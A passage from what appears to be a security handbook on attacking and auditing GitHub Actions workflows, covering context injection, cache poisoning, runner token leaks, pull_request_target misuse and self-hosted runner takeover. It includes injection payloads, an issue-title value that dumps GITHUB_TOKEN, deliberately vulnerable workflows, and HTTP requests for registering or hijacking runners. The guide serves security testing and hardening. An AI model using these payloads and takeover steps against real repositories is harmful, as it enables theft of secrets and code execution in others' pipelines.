# Abusing allowed unsecure commands

There are deprecated `set-env` and `add-path` commands that can be explicitly enabled by a user via setting the `ACTIONS_ALLOW_UNSECURE_COMMANDS` environment variable as `true`.

- `set-env` sets environment variables via the following workflow command: `::set-env name=<NAME>::<VALUE>`
- `add-path` updates the `PATH` environment variable via the following workflow command: `::add-path::<VALUE>`

Depending on the use of the environment variable, this could enable an attacker to, at worst, modify the system path to run a different command than intended, resulting in arbitrary code execution. For example, let's consider the following workflow:

```yaml
name: Vulnerable workflow

on:
  pull_request_target

env:
  # 1. Enable unsecure commands
  ACTIONS_ALLOW_UNSECURE_COMMANDS: true
  ENVIRONMENT_NAME: prod

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      # 2. Print github context
      - run: |
          print("""${{ toJSON(github) }}""")
        shell: python
      - name: Create new PR deployment
        uses: actions/github-script@v5
        with:
          # 3. Create deployment
          script: |
            return await github.rest.repos.createDeployment({
                ...context.repo,
                ref: context.payload.pull_request.head.sha,
                auto_merge: false,
                required_contexts: [],
                environment: "${{ env.ENVIRONMENT_NAME }}",
                transient_environment: false,
                production_environment: false,
            });
          github-token: ${{ secrets.GITHUB_TOKEN }}
```

This workflow prints the `github` context on the first step of the `deploy` job. Since some of the variables within the `github` context are controlled by a user and unsecure commands have been enabled, an attacker can use a PR description to set arbitrary environment variables. For instance, the following payload will set the `ENVIRONMENT_NAME` variable while printing the `github` context:

```
\n::set-env name=ENVIRONMENT_NAME::", <YOUR_JS_CODE>//\n
```

Github Runner will process this line as a worfklow command and set the variable to the malicious payload. The `actions/github-script` step injects the `ENVIRONMENT_NAME` variable using the expression `${{ }}` that allows an attacker to achive code injection.

References:

- [GHSA-mfwh-5m23-j46w: `add-path` and `set-env` Runner commands are processed via stdout](https://github.com/actions/toolkit/security/advisories/GHSA-mfwh-5m23-j46w)

# Cache poisoning

Any cache in Github Actions [shares the same scope as the base branch](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows#restrictions-for-accessing-a-cache). So, if there is a possibility to alter cached contents, you can poison the cache. In other words, whatever is cached from an incomming PR will be available in all workflows.

You can reproduce it with the following steps:

1. Create a workflow in a base repo with the next content:

    ```yml
    on: pull_request_target

    jobs:
      poison:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v2
            with:
              ref: ${{ github.event.pull_request.head.ref }}
          - uses: actions/cache@v2
            with:
              path: ~/poison
              key: poison_key
    ```

2. Fork the repo and add `poison` file with arbitrary content
3. Create a PR to the base repo and wait for the worflow to complete
4. Create a new branch in the base repo and change any file, for example `README.md`
5. Create a PR
6. The workflow will retrieve the `poison` file from the step 2

Moreover, Github Actions does not separate different [environments](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment). Let's say you have environments `development` and `production`, where `production` can only be run with approval. In this case, only certain people can run a workflow in `production` environment, while everyone else uses `development` environment. However, running these environments on the same branch can lead to cache poisoning in `production` environment, because there is a logical boundary only between branches. In other words, any developer with write permissions or an attacker who gains access to such account can poison the cache and get arbitrary code execution in `production` environments. Therefore, a developer or an attacker can at least gain access to `production` secrets.

# Leak of Github Runner registration token

Github Actions supports self-hosted runners that you can deploy and manage to run jobs. In order to deploy a self-hosted runner, it must be registered in the Github Service.

[The self-hosted runner registration process](https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners) is the exchange of a Github Runner registration token for a temporary JWT token, and the subsequent generation of an RSA key that will be used by a self-hosted runner in the future to issue JWT tokens. Hence the Github Service allows self-hosted runners to be registered based on a Github Runner registration token and identifies a self-hosted runner afterwards by its public key.

The Github Runner registration token is a short-term token that has a 1 hour expiration time and it looks like this:

```
AUUYBYBGG5FM52VMJQPIF5DCNFBZA
```

In the case of a Github Runner registration token leak, you can register a malicious runner, takeover jobs, and gain full access to secrets and code. Use the next request to check a registartion token (or follow the "[Adding self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners)" guide to add a malicious runner):

```http
POST /actions/runner-registration HTTP/1.1
Host: api.github.com
Authorization: RemoteAuth <GITHUB_RUNNER_REGISTRATION_TOKEN>
User-Agent: GitHubActionsRunner
Content-Type: application/json; charset=utf-8

{
  "url": "https://github.com/<NAMESPACE>/<PROJECT>",
  "runner_event": "register"
}
```

# Leak of sensitive data

Github actions write all details about a run to workflow logs, which include all running commands and their outputs. Logs of the public projects are available for everyone, and in the event of a leak of sensitive data to the logs, everyone can access this data.

Sensitive data can be leaked for the following reasons:

- Printing sensitive data to the logs

    ```yaml
    run: |
      # print sensitive data received from the /user endpoint
      curl --fail -H 'Authorization: Bearer ${{ secrets.GH_TOKEN }}' https://api.github.com/user || exit 1
    ```

- Running commands/scripts/apps in the verbose/debug mode

    ```yaml
    run: |
      # curl in verbose mode will leak the Auth-Token header with an authentication token
      curl -v -H "Auth-Token: $AUTH_TOKEN" https://api.website.com/
    ```

- Passing sensitive data (for instance, tokens or credentials) directly in command line

    ```yaml
    run: |
      # hardcoded token
      ./app --url api.website.com --token tETDURnbqsGTLtLB
    ```

- Misusing of sensitive data in workflows. New sensitive data may appear during execution of workflows. Github Actions allows you to mask this data in logs using [add-mask workflow command](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#masking-a-value-in-log). So, if the `add-mask` is not used or [workflow commands have been stopped](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands) sensitive data can leak to the run logs

    ```yaml
    run: |
      # TOKEN is not marked as sensitive data with add-mask
      TOKEN=$(./issue_new_token)
      # curl in verbose mode will leak TOKEN
      curl -v -H "PRIVATE-TOKEN: $TOKEN" https://api.website.com
    ```

- All [output parameters](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#setting-an-output-parameter) which have not been marked as secrets will be logged if the [echoing](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#echoing-command-outputs) or [debug mode](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/enabling-debug-logging) is enabled

    ```yaml
    // workflow or action that sets the output
    run: |
      echo "::set-output name=token::$(./get_token)"
    ```

    ```
    // workflow run log that discloses the token in plaintext
    ::set-output name=token::tETDURnbqsGTLtLB
    ```

[Byproducts of a workflow execution](https://docs.github.com/en/actions/advanced-guides) can also contain sensitive data:

- [Artifacts](https://docs.github.com/en/actions/advanced-guides/storing-workflow-data-as-artifacts) in the public repositories are available to everyone for a retention period (90 days by default). Therefore, if sensitive data is leaked to artifacts, you can [download them](https://docs.github.com/en/actions/managing-workflow-runs/downloading-workflow-artifacts) and access the data.
- Unlike artifacts, [cache](https://docs.github.com/en/actions/advanced-guides/caching-dependencies-to-speed-up-workflows) is only available while a workflow is running. However, anyone with read access can create a pull request on a repository and access the contents of the cache. Forks of a repository can also create pull requests on the base branch and access caches on the base branch.

References:
- [GitHub Docs: Security hardening - Using secrets](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-secrets)

# Misuse of contexts

GitHub Actions workflows can be triggered by a variety of [events](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows). Every workflow trigger is provided with [contexts](https://docs.github.com/en/actions/learn-github-actions/contexts).

{% hint style="info" %}
You can access context information using one of two [syntaxes](https://docs.github.com/en/actions/learn-github-actions/contexts#about-contexts):
- Index syntax: `github['sha']`
- Property dereference syntax: `github.sha`
{% endhint %}

One of the contexts is the [GitHub context](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context) that contains information about the workflow run and the event that triggered the run. The next variables in the Github context can be controlled by a user who opens a PR from a forked repo, creates an issue, submits a comment to a PR, and etc.:

```yaml
# pull_request_target
github.head_ref
github.event.pull_request.body
github.event.pull_request.head.label
github.event.pull_request.head.ref
github.event.pull_request.head.repo.default_branch
github.event.pull_request.head.repo.description
github.event.pull_request.head.repo.homepage
github.event.pull_request.title
# issues
github.event.issue.body
github.event.issue.title
# issue_comment
github.event.comment.body
github.event.issue.body
github.event.issue.title
# discussion
github.event.discussion.body
github.event.discussion.title
# discussion_comment
github.event.comment.body
github.event.discussion.body
github.event.discussion.title
# workflow_run
github.event.workflow.path
github.event.workflow_run.head_branch
github.event.workflow_run.head_commit.author.email
github.event.workflow_run.head_commit.author.name
github.event.workflow_run.head_commit.message
github.event.workflow_run.head_repository.description
```

GitHub Actions support their own [expression syntax](https://docs.github.com/en/actions/learn-github-actions/expressions) that allows access to the values of the workflow context.

```yaml
- name: Check title
  run: |
    title="${{ github.event.issue.title }}"
    if [[ ! $title =~ ^.*:\ .*$ ]]; then
      echo "Bad issue title"
      exit 1
    fi
```

The [run:](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsrun) in the sample above generates a temporary script based on the template. The expressions inside of `${{ }}` are evaluated and substituted with the resulting values before the shell script is run which may lead to command injection. Therefore, an attacker can inject a bash commands in the example above using a payload like `a"; echo test` or `` `echo test` ``.

Another context that can contain user-controlled data is the [env context](https://docs.github.com/en/actions/learn-github-actions/contexts#env-context). The `env` context contains environment variables that have been set in a workflow, job, or step. Using variable interpolation `${{ }}` with the `env` context data in a `run:` could allow an attacker to inject their own code into the runner:

```yaml
on:
  issues:

env:
  TITLE: "${{ github.event.issue.title }}"

jobs:
  check-title:
    runs-on: ubuntu-latest
    steps:
      - name: Check title
        run: |
          title="${{ env.TITLE }}"
          if [[ ! $title =~ ^.*:\ .*$ ]]; then
            echo "Bad issue title"
            exit 1
          fi
```

Additionally, you can control values of the `outputs` property that is provided by [steps](https://docs.github.com/en/actions/learn-github-actions/contexts#steps-context) and [needs](https://docs.github.com/en/actions/learn-github-actions/contexts#needs-context) contexts:
- [steps.<step_id>.outputs](https://docs.github.com/en/actions/learn-github-actions/contexts#steps-context)
- [needs.<job_id>.outputs](https://docs.github.com/en/actions/learn-github-actions/contexts#needs-context)

The `outputs` property contains the result/output of a specific job or step. `outputs` may accept user-controlled data which can be passed to the `run:`. In the following example it is possible to execute arbitrary commands by creating a PR named `` `;arbitrary_command_here();// `` because `steps.fetch-branch-names.outputs.prs-string` contains the title of PRs:

```yml
jobs:
  combine-prs:
    runs-on: ubuntu-latest
    steps:
      # action uses PR's title to craft prs-string output
      - uses: actions/github-script@v6
        id: fetch-branch-names
        name: Fetch branch names
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const pulls = await github.paginate('GET /repos/:owner/:repo/pulls', {
              owner: context.repo.owner,
              repo: context.repo.repo
            });
            branches = [];
            prs = [];
            base_branch = null;
            for (const pull of pulls) {
                // ...
                if (statusOK) {
                  console.log('Adding branch to array: ' + branch);
                  branches.push(branch);
                  prs.push('Closes #' + pull['number'] + ' ' + pull['title']);
                  base_branch = pull['base']['ref'];
                }
              }
            }
            // ...
            core.setOutput('prs-string', prs.join('\n'));
            // ...
      # action uses crafted prs-string within the ${{ }} expression
      - uses: actions/github-script@v6
        name: Create Combined Pull Request
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const prString = `${{ steps.fetch-branch-names.outputs.prs-string }}`;
            // ...
```

The same is applicable to [data that is sent to the pre and post actions](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#sending-values-to-the-pre-and-post-actions).

Moreover, there are several github actions that, if misused, could lead to a vulnerability as well:

| Github action | Description | Potential vulnerability |
| --- | --- | --- |
| [actions/github-script](https://github.com/actions/github-script) | Write workflows scripting the GitHub API in JavaScript | Using variable interpolation `${{ }}` with `script:` can lead to JavaScript code injection |
| [octokit/graphql-action](https://github.com/octokit/graphql-action) | A GitHub Action to send queries to GitHub's GraphQL API | Using variable interpolation `${{ }}` with `query:` can lead to injection to a GraphQL request |
| [octokit/request-action](https://github.com/octokit/request-action) | A GitHub Action to send arbitrary requests to GitHub's REST API | Using variable interpolation `${{ }}` with `route:` can lead to injection to a request to REST API |

References:
- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [GitHub Docs: Security hardening - Understanding the risk of script injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [GitHub Security Lab: Hack this repository: The EkoParty 2020 GitHub CTF challenges](https://securitylab.github.com/research/ekoparty-ctf/)
- [Writeup: Potential remote code execution in PyPI](https://blog.ryotak.me/post/pypi-potential-remote-code-execution-en/)

# Misconfiguration of OpenID Connect

With OpenID Connect, a GitHub Actions workflow requires a token in order to access resources in a cloud provider. The workflow requests an access token from a cloud provider, which checks the details presented by the JWT. If the trust configuration in the JWT is a match, a cloud provider responds by issuing a temporary token to the workflow, which can then be used to access resources in a cloud provider.

When developers configure a cloud to trust GitHub's OIDC provider, they must add conditions that filter incoming requests, so that untrusted repositories or workflows can't request access tokens for cloud resources. `Audience` and `Subject` claims are typically used in combination while setting conditions on the cloud role/resources to scope its access to the GitHub workflows.

- `Audience`: By default, this value uses the URL of the organization or repository owner. This can be used to set a condition that only the workflows in the specific organization can access the cloud role.
- `Subject`: Has a predefined format and is a concatenation of some of the key metadata about the workflow, such as the GitHub organization, repository, branch or associated job environment. There are also many additional claims supported in the OIDC token that can also be used for setting these conditions.

However, if a cloud provider is misconfigured, untrusted repositories can request access tokens for a cloud resources.

References:
- [GitHub Docs: About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)

# Misuse of the events related to incoming PRs

Github workflows can be triggered by events related to incoming pull requests:

| Event | REF | Possible `GITHUB_TOKEN` permissions | Access to secrets |
| --- | --- | --- | --- |
| [pull_request](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request) (external forks) | PR merge branch | read | no |
| [pull_request](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request) (branches in the same repo) | PR merge branch | write | yes |
| [pull_request_target](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request_target) | PR base branch | write | yes |
| [issue_comment](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#issue_comment) | Default branch | write | yes |
| [workflow_run](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) | Default branch | write | yes |

- [pull_request](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request) and [pull_request_target](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request_target) triggered a workflow when activity on a pull request in the workflow's repository occurs. The main differences between the two triggers are:

  1. Workflows triggered via `pull_request_target` have write permission to the target repository and have access to target repository secrets. The same is true for workflows triggered on `pull_request` from a branch in the same repository, but not from external forks. The reasoning behind the latter is that it is safe to share the repository secrets if the user creating the PR has write permission to the target repository already.
  2. `pull_request_target` runs in the context of the target repository of the pull request, rather than in the merge commit. This means the standard checkout action uses the target repository to prevent accidental usage of a user supplied code.

- [issue_comment](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#issue_comment) runs a workflow when a pull request comment is created, edited, or deleted.
- [workflow_run](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) runs a workflow when a workflow run is requested or completed. It allows executing a workflow based on execution or completion of another workflow.

Normally, using `pull_request_target`, `issue_comment` or `workflow_run` is safe because actions only run code from a target repository, not an incoming pull request. However, if a workflow uses these events with an explicit checkout of a pull request, it can lead to untrusted code execution.

```yml
on:
  pull_request_target

jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
        # check out incoming PR code
        - uses: actions/checkout@v2
          with:
            ref: ${{ github.event.pull_request.head.sha }}
        - uses: actions/setup-node@v1
        # potentially untrusted code is being run during npm install or npm build
        # as the build scripts and referenced packages are controlled by the author of the PR
        - run: |
            npm install
            npm build
```

There are several ways to checkout a code from a pull request:

- [actions/checkout](https://github.com/actions/checkout) to checkout changes from a head repo

    ```yaml
    - uses: actions/checkout@v2
      with:
        ref: refs/pull/${{ github.event.pull_request.number }}/merge
    ```

- Explicitly checking out with `git` in the `run:` block

    ```yaml
    run: |
      git fetch origin $HEAD_BRANCH
      git checkout origin/master
      git config user.name "release-hash-check"
      git config user.email "<>"
      git merge --no-commit --no-edit origin/$HEAD_BRANCH
    env:
      HEAD_BRANCH: ${{ github.head_ref }}
    ```

- Use Github API or third-party actions:

    ```yaml
    - uses: octokit/request-action@v2.1.4
      id: get_pull_request
      with:
        route: GET /repos/{owner}/{repo}/pulls/{number}
        owner: namespace
        repo: reponame
        number: ${{ github.event.issue.number }}
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    ```

The following context variables may help to find checking out from an incoming pull request:

```yaml
github.head_ref
github.event.number
github.event.pull_request.head.ref
github.event.pull_request.head.repo.default_branch
github.event.pull_request.head.repo.id
github.event.pull_request.head.sha
github.event.pull_request.merge_commit_sha
github.event.pull_request.number
github.event.pull_request.id
github.event.workflow_run.head_branch
github.event.workflow_run.head_repository.id
github.event.workflow_run.head_sha
# id is a commit sha
github.event.workflow_run.head_commit.id
# environment variable
env.GITHUB_HEAD_REF
```

References:
- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [GHSL-2021-1032: Unauthorized repository modification or secrets exfiltration from a Pull Request in Solana GitHub workflow](https://securitylab.github.com/advisories/GHSL-2021-1032_Solana/)
- [Writeup: GitHub Actions check-spelling community workflow - GITHUB_TOKEN leakage via advice.txt symlink](https://github.com/justinsteven/advisories/blob/master/2021_github_actions_checkspelling_token_leak_via_advice_symlink.md)

# Misuse of the pull_request_target event in non-default branches

The `pull_request_target` based workflows can be triggered in non-default branches, if there is no restriction based on `branches` and `branches-ignore` filters:

```yaml
on: 
  pull_request_target:
    branches:
      main
      release*
      v1.*.*

# ...
```

In this case, Github will use a workflow from a non-default branch instead of the main one when creating a PR to that branch. So, if there is a vulnerable workflow in a non-default branch, you can open a PR to that branch and exploit a vulnerability. This is a common pitfall when fixing vulnerabilities, developers can only fix a vulnerability in the main branch and leave the vulnerable version in non-default branches.

# Misuse of the workflow_run event

[workflow_run](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#workflow_run) was introduced to enable scenarios that require building the untrusted code and also need write permissions to update the PR with e.g. code coverage results or other test results. To do this in a secure manner, the untrusted code is handled via the [pull_request](https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request) trigger so that it is isolated in an unprivileged environment. The workflow processing the PR stores any results like code coverage or failed/passed tests in artefacts and exits. The following workflow then starts on `workflow_run` where it is granted write permission to the target repository and access to repository secrets, so that it can download the artefacts and make any necessary modifications to the repository or interact with third party services that require repository secrets (e.g. API tokens).

Nevertheless, there are still ways of transferring data controlled by a user from untrusted PRs to a privileged `workflow_run` workflow context:

1. Using the `github.event.workflow_run` context. Please, check out [Misuse of contexts](#misuse-of-contexts) and [Misuse of the events related to incoming PRs](#misuse-of-the-events-related-to-incoming-prs) for more details.
1. Using artefacts. For instance, artefacts can contain binaries or scripts built from an untrusted PR that will be run in a privileged workflow.

Actually, even if a `workflow_run` workflow does not properly use context variables or artefacts, it may still be unexploitable because the `pull_request` event requires an approval from owners for PRs from forked repos. By default, `pull_request` workflows [require approval only for first time contributors](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#controlling-changes-from-forks-to-workflows-in-public-repositories). So, if a repository does not require approval for all outside collaborators (default behaviour), you can actually make changes to the target repo to become a contributor. After that, you will be able to fully control a `pull_request` workflow for exploitation.

References:
- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)

## Detection of the download of artefacts

You can use the following examples to detect artefacts downloading:

1. `actions/github-script` with `github.rest.actions.listWorkflowRunArtifacts()`

    ```yaml
    - uses: actions/github-script@v6
      with:
        script: |
          let allArtifacts = await github.rest.actions.listWorkflowRunArtifacts({
              owner: context.repo.owner,
              repo: context.repo.repo,
              run_id: context.payload.workflow_run.id,
          });
          let matchArtifact = allArtifacts.data.artifacts.filter((artifact) => {
              return artifact.name == "<ARTEFACT_NAME>"
          })[0];
          let download = await github.rest.actions.downloadArtifact({
              owner: context.repo.owner,
              repo: context.repo.repo,
              artifact_id: matchArtifact.id,
              archive_format: 'zip',
          });
    ```

1. Third-party actions, such as [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

    ```yaml
    - uses: dawidd6/action-download-artifact@v2
    ```

1. `gh run download`

    ```yaml
    - run: gh run download "${WORKFLOW_RUN_ID}" --repo "${GITHUB_REPOSITORY}" --name "comment"
    ```

1. `gh api` with `github.event.workflow_run.artifacts_url`

    ```yaml
    run: |
      artifacts_url=${{ github.event.workflow_run.artifacts_url }}
      gh api "$artifacts_url" -q '.artifacts[] | [.name, .archive_download_url] | @tsv' | while read artifact
      # ...
    ```

# Misuse of self-hosted runners

Self-hosted runners can be launched as an [ephemeral](https://docs.github.com/en/actions/hosting-your-own-runners/autoscaling-with-self-hosted-runners#using-ephemeral-runners-for-autoscaling) using the [--ephemeral](https://docs.github.com/en/actions/hosting-your-own-runners/autoscaling-with-self-hosted-runners#using-ephemeral-runners-for-autoscaling) option. [ephemeral](https://docs.github.com/en/actions/hosting-your-own-runners/autoscaling-with-self-hosted-runners#using-ephemeral-runners-for-autoscaling) option configures a self-hosted runner to only take one job and then let the service un-configure the runner after the job finishes. This is implemented by sending the `ephemeral` value within a request during runner registration:

```http
POST /l8zOmabebUmdmqSaVGVjnhvkK9o6XCANRwPqdM3hfsO92dqZdj/_apis/distributedtask/pools/1/agents HTTP/2
Host: pipelines.actions.githubusercontent.com
User-Agent: VSServices/2.290.1.0
Authorization: Bearer <TOKEN>
Content-Type: application/json; charset=utf-8; api-version=6.0-preview.2

{
  "labels": [
    ...
  ],
  "maxParallelism": 1,
  "createdOn": "0001-01-01T00:00:00",
  "authorization": {
    ...
  },
  "id": 0,
  "name": "Dummy-Runner",
  "version": "2.290.1",
  "osDescription": "Darwin 21.4.0",
  "ephemeral": true,
  "disableUpdate": false,
  "status": 0,
  "provisioningState": "Provisioned"
}
```

As a result, an ephemeral runner has the following lifecycle:

1. The runner is registered with the GitHub Actions service.
2. The runner takes an one job and performs it.
3. When the runner completes the job, it cleans up local environment (`.runner`, `.credentials`, `.credentials_rsaparams` files)
4. The GitHub Actions service automatically de-registers the runner.

Therefore, if an attacker gain access to ephemeral self-hosted runner, they will not be able to affect other jobs.

However, self-hosted runners are not launched as an ephemeral by default and there is no guarantee around running in ephemeral clean virtual environment. So, runners can be persistently compromised by untrusted code in a workflow. An attacker can abuse a workflow to access the following files that are stored in a root folder of a runner host:

- `.runner` that contains general info about a runner (id, name, pool id, etc.).
- `.credentials` that contains authentication details such as the scheme used and authorization URL.
- `.credentials_rsaparams` that contains the RSA parameters that were genereted during registrarion and are used to sign JWT tokens.

These files can be used to takeover a self-hosted runner with the next steps:

1. Fetch `.runner`, `.credentials`, `.credentials_rsaparams` files with all the necessary data written during the runner registration.
2. Get an access token using the following request:

    ```http
    POST /_apis/oauth2/token/<UUID> HTTP/2
    Host: vstoken.actions.githubusercontent.com
    User-Agent: GitHubActionsRunner
    Content-Type: application/x-www-form-urlencoded

    grant_type=client_credentials&client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=<BEARER_TOKEN>
    ```

    Where:
    - `UUID` can be found in `.credentials` file.
    - `BEARER_TOKEN` [is generated](https://github.com/actions/runner/blob/a7aadf561531e581f92663e88d33e1d488cbcd7a/src/Sdk/WebApi/WebApi/OAuth/VssOAuthJwtBearerAssertion.cs#L120) using the parameters from `.credentials` and `.credentials_rsaparams` files.

3. Remove a current session:

    ```http
    DELETE /<RANDOM_PREFIX>/_apis/distributedtask/pools/1/sessions/<SESSION_ID> HTTP/2
    Host: pipelines.actions.githubusercontent.com
    User-Agent: VSServices/2.290.1.0
    Authorization: Bearer <BEARER_TOKEN>
    ```

    Where:
    - `RANDOM_PREFIX` can be found in `.runner` file.
    - `SESSION_ID` is a session ID which can be found in `_diag/Runner_<DATE>-utc.log` file with the runner logs.
    - `BEARER_TOKEN` is a bearer token from the response in the previous step.

4. Copy `.runner`, `.credentials`, `.credentials_rsaparams` files to a root folder of a malicious runner.
5. Run a malicious runner.

The takeover has the greatest impact when a self-hosted runner is defined at the organization or enterprise level, because Github can schedule workflows from multiple repositories onto the same runner. It allows an attacker to gain access to the jobs which will use the malicious runner.

References:
- [GitHub Docs: Hosting your own runners](https://docs.github.com/en/actions/hosting-your-own-runners)
- [actions/runner docs: Runner Authentication and Authorization](https://github.com/actions/runner/blob/main/docs/design/auth.md)
- [GitHub Docs: Security hardening - Hardening for self-hosted runners](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#hardening-for-self-hosted-runners)
- [Writeup: Zuckerpunch - Abusing Self Hosted Github Runners at Facebook](https://marcyoung.us/post/zuckerpunch/)

## Using the pull_request event with self-hosted runners

Github does not provide a mechanism to prevent `pull_request` based workflows from being triggered from a forked repository. The only thing available is to [require approval for all outside collaborators](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#controlling-changes-from-forks-to-workflows-in-public-repositories). However, if approval is only required for the first contribution, you can make some valid changes and then add a `pull_request` based workflow running on a self-hosted runner.

References:
- [GitHub Docs: Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository)

## Detection of the use of self-hosted runners

You can find a using of self-hosted runners by the following [runs-on](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idruns-on) labels (remember about [a build matrix](https://docs.github.com/en/actions/using-jobs/using-a-build-matrix-for-your-jobs) as well):
- `self-hosted` default label applied to all self-hosted runners
- `linux`, `windows`, or `macOS` applied depending on operating system
- `x64`, `ARM`, or `ARM64` applied depending on hardware architecture
- Custom labels, which are manually assigned to self-hosted runners (there is a [list](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#choosing-github-hosted-runners) with Github-hosted runner labels which can't be custom ones)

# Using vulnerable actions

An [action](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions) is a custom application for the GitHub Actions platform that performs a complex but frequently repeated task. Like any code [actions can be vulnerable](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions) - it can be a vulnerability in the code of an action or a used package or dependency. Since individual jobs in a workflow can interact with other jobs, if one of the jobs uses a vulnerable action, it can compromise the entire workflow. For example, a job querying the environment variables used by a later job, writing files to a shared directory that a later job processes, or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them.

There are three type of actions:
- [Composite action](#composite-action)
- [JavaScript action](#javascript-action)
- [Docker container action](#docker-action)

## Composite action

[Composite action](https://docs.github.com/en/actions/creating-actions/creating-a-composite-action) is used to execute the defined steps that can run shell code or use other actions.

{% hint style="info" %}
Since a composite action can run scripts written on different languages (bash, python, go, etc.), they can also be vulnerable to common weaknesses like code/command injection, path traversal, and etc.
{% endhint %}

### Command injection

Composite actions allow defining [inputs](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs) which can be used during execution:

```yml
# fake-actions/composite-action
name: 'Hello World'
description: 'Greet someone'

inputs:
  who-to-greet:
    description: 'Who to greet'
    required: true

runs:
  using: "composite"
  steps:
    - run: echo Hello ${{ inputs.who-to-greet }}.
      shell: bash
```

Handling inputs is performed using variable interpolation `${{ ... }}`. Therefore, if the inputs are embedded directly to the [run:](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsrun) block, an attacker can inject arbitrary commands:

```yml
on: workflow_dispatch

jobs:
  test:
    runs-on: ubuntu-latest
    name: A job to say hello
    steps:
      - uses: actions/checkout@v2
      - uses: fake-actions/composite-action@v1
        with:
          # this input will be injected to the run: block in fake-actions/composite-action
          # it will look in the following way:
          #
          # runs:
          #   using: "composite"
          #   steps:
          #     - run: echo Hello World!; echo hop.
          #       shell: bash
          who-to-greet: 'World!; echo hop'
```

As a result, it is possible at least extract secrets from environment variables and generated shell scripts. For instance, in the snippet below an attacker can open an issues with title `";{cat,/home/runner/work/_temp/$({xxd,-r,-p}<<<2a)}|{base64,-w0};#` to dump `GITHUB_TOKEN`:

```yml
# Vulnerable third-party action:
# fake-actions/update-issues
inputs:
  issue_number:
    description: 'Issue number'
    required: true
  issue_title:
    description: 'Issue title'
    required: true
  github_token:
    description: 'GitHub API token'
    required: false
    default: ${{ github.token }}

runs:
  using: composite
  steps:
  - name: Run
    shell: bash
    # inject inputs directly to the run: block
    # we can use the injection to dump the generated shell script
    # and access the github_token
    run: |
      pip3 install -r requirements.txt
      ./check.py --token "${{ inputs.github_token }}" \
        --issue-number "${{ inputs.issue_number }}" \
        --issue-title "${{ inputs.issue_title }}"
```

```yml
# Workflow that uses fake-actions/update-issues
on:
  issues:
    types: [open, edited]

jobs:
  test:
    runs-on: ubuntu-latest
    name: Check issue title
    steps:
      - uses: actions/checkout@v2
      - uses: fake-actions/update-issues@v1
        with:
          issue_number: ${{ github.event.issue.number }}
          # uses issue title as input
          # issue title is controlled by a user
          issue_title: ${{ github.event.issue.title }}
```

The same is applicable for contexts that can be used for command injection, check [Misuse of contexts](#misuse-of-contexts).

### Disclosure of sensitive data

